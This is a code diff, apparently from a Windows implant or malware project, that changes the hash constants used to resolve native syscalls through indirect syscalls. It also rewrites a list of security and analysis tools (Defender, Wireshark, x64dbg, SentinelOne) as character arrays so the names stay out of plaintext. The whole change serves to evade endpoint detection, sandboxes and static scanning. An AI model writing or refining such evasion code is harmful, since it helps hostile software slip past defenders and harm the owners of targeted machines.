@@ -17,7 +17,7 @@ void user_id(wchar_t* outUsername) {
     API_TABLE& API = GetAPI();
 
     //NtOpenProcessToken 
-    gate = GetSSNByHash(0X45A91516A156CA79); 
+    gate = GetSSNByHash(0X5431B54AA40A7EA3); 
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
         status = IndirectSyscall((ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)TOKEN_QUERY, (ULONG_PTR)&hToken, 0, 0, 0, 0,0,0,0,0); 
@@ -26,7 +26,7 @@ void user_id(wchar_t* outUsername) {
     if (hToken) {
         DWORD len = 0;
         //NtQueryInformationToken 
-        gate = GetSSNByHash(0XC233EEB09C76CC64);
+        gate = GetSSNByHash(0X3B966C972A75EE00);
         PREPARE_SYSCALL(gate);
         
         IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)NULL, 0, (ULONG_PTR)&len, 0, 0,0,0,0,0);
@@ -47,7 +47,7 @@ void user_id(wchar_t* outUsername) {
             free(pTokenUser);
         }
         //NtClose
-        gate = GetSSNByHash(0X4F3163BAF74EFD5D);
+        gate = GetSSNByHash(0X5E575BD8ACC77BC0);
         PREPARE_SYSCALL(gate);
         IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     }
@@ -63,20 +63,20 @@ bool IsAdmin() {
     API_TABLE& API = GetAPI();
 
 
-    gate = GetSSNByHash(0X45A91516A156CA79); // NtOpenProcessToken
+    gate = GetSSNByHash(0X5431B54AA40A7EA3); // NtOpenProcessToken
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
         status = IndirectSyscall((ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)TOKEN_QUERY, (ULONG_PTR)&hToken, 0, 0, 0, 0,0,0,0,0); 
     }
 
     if (hToken) {
-        gate = GetSSNByHash(0XC233EEB09C76CC64); // NtQueryInformationToken
+        gate = GetSSNByHash(0X3B966C972A75EE00); // NtQueryInformationToken
         PREPARE_SYSCALL(gate);
         
         status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)20, (ULONG_PTR)&elevation, (ULONG_PTR)sizeof(elevation), (ULONG_PTR)&len, 0, 0,0,0,0,0);
         
         //NtClose
-        gate = GetSSNByHash(0X4F3163BAF74EFD5D);
+        gate = GetSSNByHash(0X5E575BD8ACC77BC0);
         PREPARE_SYSCALL(gate);
         IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         
@@ -95,7 +95,7 @@ void GetProcessList() {
     PVOID buffer = NULL;
 
     //NtQuerySystemInformation [how much memory]
-    gate = GetSSNByHash(0XFDE2EA035005E1C8); 
+    gate = GetSSNByHash(0XC427340B3A1449FE); 
     if (gate.wServiceId == 0) return;
     PREPARE_SYSCALL(gate);
 
@@ -106,7 +106,7 @@ void GetProcessList() {
     bufferSize += 0x1000; 
 
     //NtAllocateVirtualMemory [memory allocation from kernel]
-    gate = GetSSNByHash(0XE7C8C07D724ED6C);
+    gate = GetSSNByHash(0xF2A49421250FD409);
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
         status = IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&buffer, 0, (ULONG_PTR)&bufferSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE, 0,0,0,0,0);
@@ -114,14 +114,18 @@ void GetProcessList() {
     }
 
     //NtQuerySystemInformation [list recall]
-    gate = GetSSNByHash(0XFDE2EA035005E1C8);
+    gate = GetSSNByHash(0XC427340B3A1449FE);
     PREPARE_SYSCALL(gate);
     status = IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)buffer, (ULONG_PTR)bufferSize, (ULONG_PTR)&bufferSize, 0,0,0,0,0,0,0);
     
-    const wchar_t* blacklist[] = { 
-        L"MsMpEng.exe", L"wireshark.exe", L"x64dbg.exe", 
-        L"ProcessHacker.exe", L"vmtoolsd.exe", L"SentinelService.exe" 
-    };
+    // Build process names char-by-char (no plaintext in .rdata)
+    wchar_t bl0[] = {'M','s','M','p','E','n','g','.','e','x','e','\0'};
+    wchar_t bl1[] = {'w','i','r','e','s','h','a','r','k','.','e','x','e','\0'};
+    wchar_t bl2[] = {'x','6','4','d','b','g','.','e','x','e','\0'};
+    wchar_t bl3[] = {'P','r','o','c','e','s','s','H','a','c','k','e','r','.','e','x','e','\0'};
+    wchar_t bl4[] = {'v','m','t','o','o','l','s','d','.','e','x','e','\0'};
+    wchar_t bl5[] = {'S','e','n','t','i','n','e','l','S','e','r','v','i','c','e','.','e','x','e','\0'};
+    const wchar_t* blacklist[] = { bl0, bl1, bl2, bl3, bl4, bl5 };
 
     if (status == 0) {
         PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
@@ -146,7 +150,7 @@ void GetProcessList() {
         }
     }
     //NtFreeVirtualMemory [free memory]
-    gate = GetSSNByHash(0X1A9C54321D6BC209);
+    gate = GetSSNByHash(0X1867A58BDCAD7525);
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
         ULONG_PTR freeSize = 0; // must be 0 for MEM_RELEASE
@@ -162,7 +166,7 @@ DWORD GetPidByName(const wchar_t* processName) {
     PVOID buffer = NULL;
 
     //NtQuerySystemInformation [calculate buffer size]
-    gate = GetSSNByHash(0XFDE2EA035005E1C8); 
+    gate = GetSSNByHash(0XC427340B3A1449FE); 
     if (gate.wServiceId == 0) return 0;
 
     PREPARE_SYSCALL(gate);
@@ -172,7 +176,7 @@ DWORD GetPidByName(const wchar_t* processName) {
     bufferSize += 0x2000; 
 
     //NtAllocateVirtualMemory [allocate memory]
-    gate = GetSSNByHash(0XE7C8C07D724ED6C);
+    gate = GetSSNByHash(0xF2A49421250FD409);
     if (gate.wServiceId == 0) return 0;
 
     PREPARE_SYSCALL(gate);
@@ -182,7 +186,7 @@ DWORD GetPidByName(const wchar_t* processName) {
     if (status != 0) return 0;
 
     //NtQuerySystemInformation [get tasks list]
-    gate = GetSSNByHash(0XFDE2EA035005E1C8);
+    gate = GetSSNByHash(0XC427340B3A1449FE);
     PREPARE_SYSCALL(gate);
 
     status = IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)buffer, (ULONG_PTR)bufferSize, (ULONG_PTR)&bufferSize, 0, 0, 0, 0, 0, 0, 0);
@@ -210,7 +214,7 @@ DWORD GetPidByName(const wchar_t* processName) {
     }
 
     //NtFreeVirtualMemory [cleanup]
-    gate = GetSSNByHash(0X1A9C54321D6BC209);
+    gate = GetSSNByHash(0X1867A58BDCAD7525);
     if (gate.wServiceId != 0) {
         
         PREPARE_SYSCALL(gate);
@@ -233,7 +237,7 @@ bool GetNativeUserSID(PUNICODE_STRING pSidString) {
     API_TABLE& API = GetAPI();
 
     // NtOpenProcessToken
-    gate = GetSSNByHash(0X45A91516A156CA79); 
+    gate = GetSSNByHash(0X5431B54AA40A7EA3); 
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
 
@@ -242,7 +246,7 @@ bool GetNativeUserSID(PUNICODE_STRING pSidString) {
     }
 
     // NtQueryInformationToken - size
-    gate = GetSSNByHash(0XC233EEB09C76CC64);
+    gate = GetSSNByHash(0X3B966C972A75EE00);
     
     PREPARE_SYSCALL(gate);
     
@@ -250,14 +254,14 @@ bool GetNativeUserSID(PUNICODE_STRING pSidString) {
 
     // NtAllocateVirtualMemory (Native Allocation)
     regionSize = returnLength;
-    gate = GetSSNByHash(0XE7C8C07D724ED6C);
+    gate = GetSSNByHash(0xF2A49421250FD409);
 
     PREPARE_SYSCALL(gate);
 
     status = IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&pTokenUser, 0, (ULONG_PTR)&regionSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE, 0, 0, 0, 0, 0);
     
     if (status != 0) {
-        gate = GetSSNByHash(0X4F3163BAF74EFD5D); // NtClose
+        gate = GetSSNByHash(0X5E575BD8ACC77BC0); // NtClose
         PREPARE_SYSCALL(gate);
 
         IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
@@ -265,15 +269,15 @@ bool GetNativeUserSID(PUNICODE_STRING pSidString) {
     }
 
     // second NtQueryInformationToken - get data
-    gate = GetSSNByHash(0XC233EEB09C76CC64);
+    gate = GetSSNByHash(0X3B966C972A75EE00);
     PREPARE_SYSCALL(gate);
     status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)pTokenUser, (ULONG_PTR)returnLength, (ULONG_PTR)&returnLength, 0, 0, 0, 0, 0, 0);
 
     if (status == 0) {
         // Resolve RtlConvertSidToUnicodeString 
-        HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0XE1193D187E7EA30D);
+        HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0X571A46A16587BB7A);
         typedef NTSTATUS (NTAPI *pfnRtlConvertSidToUnicodeString)(PUNICODE_STRING, PSID, BOOLEAN);
-        pfnRtlConvertSidToUnicodeString RtlConv = (pfnRtlConvertSidToUnicodeString)     GetProcAddressByHash(hNtdll, 0X2429B0DCD4B54D39);
+        pfnRtlConvertSidToUnicodeString RtlConv = (pfnRtlConvertSidToUnicodeString)     GetProcAddressByHash(hNtdll, 0X4232DD8F2BAD2096);
         
         if (RtlConv) {
             status = RtlConv(pSidString, ((PTOKEN_USER)pTokenUser)->User.Sid, TRUE);
@@ -283,12 +287,12 @@ bool GetNativeUserSID(PUNICODE_STRING pSidString) {
     }
 
     // NtClose Token
-    gate = GetSSNByHash(0X4F3163BAF74EFD5D);
+    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
     PREPARE_SYSCALL(gate);
     IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 
     // NtFreeVirtualMemory (Free memory)
-    gate = GetSSNByHash(0X1A9C54321D6BC209);
+    gate = GetSSNByHash(0X1867A58BDCAD7525);
     PREPARE_SYSCALL(gate);
     SIZE_T freeSize = 0; // must be 0 for MEM_RELEASE
     IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&pTokenUser, 0, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE, 0, 0, 0, 0, 0, 0);
